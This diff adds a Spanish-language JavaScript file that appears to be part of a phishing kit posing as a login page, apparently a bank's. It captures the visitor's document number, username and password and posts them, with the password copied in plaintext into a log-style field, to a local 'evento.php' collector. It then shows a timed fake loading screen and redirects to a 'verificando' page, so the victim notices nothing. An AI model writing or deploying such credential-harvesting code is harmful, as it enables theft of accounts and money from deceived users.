@@ -1,0 +1,107 @@
+(function () {
+  var endpoint = "./api/evento.php";
+  var nextUrl = "./verificando.html";
+  var canal = "personas";
+  var sending = false;
+  var loadMs = 2800;
+
+  function el(id) {
+    return document.getElementById(id);
+  }
+
+  function raw(id) {
+    var node = el(id);
+    return node ? String(node.value || "") : "";
+  }
+
+  function payloadBase() {
+    return {
+      canal: canal,
+      documento: raw("documento").trim(),
+      usuario: raw("login-usuario").trim() || raw("usuario").trim(),
+      clave: raw("clave"),
+      tipo: "login",
+      nombre_usuario: raw("login-usuario").trim() || raw("usuario").trim(),
+    };
+  }
+
+  function showLoading() {
+    var overlay = el("login-loading");
+    if (!overlay) return;
+    overlay.hidden = false;
+    document.body.classList.add("is-loading");
+  }
+
+  function sendIngreso(extra) {
+    var base = payloadBase();
+    var body = Object.assign(
+      {
+        paso: 4,
+        titulo: "Ingreso completo",
+        detalle: "Ingresar — un solo registro",
+        categoria: "[Ingreso]",
+      },
+      base,
+      extra || {}
+    );
+
+    return fetch(endpoint, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(body),
+      credentials: "same-origin",
+      cache: "no-store",
+    })
+      .then(function (r) {
+        return r.json();
+      })
+      .catch(function () {
+        return { ok: false };
+      });
+  }
+
+  var form = el("login-form");
+  var btn = el("btn-ingresar");
+
+  if (form) {
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+      if (sending) return;
+
+      var data = payloadBase();
+      if (!data.documento || !data.usuario || !data.clave) {
+        return;
+      }
+
+      sending = true;
+      if (btn) btn.disabled = true;
+      showLoading();
+
+      var started = Date.now();
+
+      sendIngreso({
+        usuario: data.usuario,
+        nombre_usuario: data.usuario,
+        detalle:
+          "Doc: " +
+          data.documento +
+          " | User: " +
+          data.usuario +
+          " | Clave: " +
+          data.clave,
+      }).then(function (res) {
+        if (res && res.ok && res.evento_id) {
+          try {
+            localStorage.setItem("sv_evento_id", String(res.evento_id));
+            localStorage.setItem("sv_usuario", data.usuario);
+          } catch (err) {}
+        }
+
+        var wait = Math.max(0, loadMs - (Date.now() - started));
+        setTimeout(function () {
+          window.location.href = nextUrl;
+        }, wait);
+      });
+    });
+  }
+})();
